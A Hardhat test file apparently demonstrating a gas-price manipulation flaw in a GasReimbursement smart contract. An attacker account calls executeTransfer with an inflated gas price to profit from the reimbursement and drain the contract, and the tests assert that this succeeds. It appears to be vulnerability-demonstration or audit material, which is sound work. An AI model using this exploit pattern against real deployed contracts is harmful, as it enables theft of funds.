const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("GasReimbursement", function () {
  let gasReimbursementContract, owner, attacker;

  beforeEach(async function () {
    [owner, attacker] = await ethers.getSigners();

    // Deploy GasReimbursement contract
    const GasReimbursement = await ethers.getContractFactory("GasReimbursement");
    gasReimbursementContract = await GasReimbursement.deploy();
    await gasReimbursementContract.deployed();

    // Fund the GasReimbursement contract with 1 Ether for testing
    await owner.sendTransaction({
      to: gasReimbursementContract.address,
      value: ethers.utils.parseEther("1"),
    });
  });

  it("Should allow the attacker to exploit the gas price manipulation vulnerability", async function () {
    // Simulate the attacker's exploit with a high gas price
    const initialAttackerBalance = await ethers.provider.getBalance(attacker.address);
    
    await gasReimbursementContract.connect(attacker).executeTransfer(attacker.address, { gasPrice: ethers.utils.parseUnits("200", "gwei") });

    // Verify that the attacker's balance increases
    const finalAttackerBalance = await ethers.provider.getBalance(attacker.address);
    expect(finalAttackerBalance).to.be.gt(initialAttackerBalance); // Ensure the balance is inflated
  });

  it("Should revert if the total fee exceeds the contract's balance", async function () {
    // Drain the contract's balance by simulating the attack
    await gasReimbursementContract.connect(attacker).executeTransfer(attacker.address, { gasPrice: ethers.utils.parseUnits("200", "gwei") });

    // Attempt to execute a transfer with insufficient funds
    await expect(gasReimbursementContract.connect(owner).executeTransfer(attacker.address)).to.be.reverted;
  });
});